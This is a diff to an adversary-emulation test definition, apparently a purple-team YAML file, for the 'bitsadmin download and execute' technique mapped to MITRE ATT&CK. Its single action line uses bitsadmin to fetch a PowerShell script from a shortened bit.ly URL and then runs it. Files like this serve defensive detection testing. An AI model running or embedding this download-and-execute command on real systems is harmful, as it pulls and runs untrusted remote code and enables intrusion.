@@ -10,7 +10,7 @@ meta:
   mitre_attack_phase: Execution
   mitre_attack_technique: Command-Line Interface
   purple_actions:
-    1: cmd.exe /c bitsadmin.exe  /transfer /Download /priority high http://bit.ly/2fMPgDz C:\\Tools\\Default_File_Path.ps1; cmd.exe /c powershell C:\\Tools\\Default_File_Path.ps1
+    1: cmd.exe /c bitsadmin.exe /transfer metta /Download /priority high http://bit.ly/2fMPgDz C:\Tools\Default_File_Path.ps1; cmd.exe /c powershell C:\Tools\Default_File_Path.ps1
 os: windows
 name: bitsadmin download and execute
 uuid: 9032c792-8cf4-4597-b271-2080d828997b
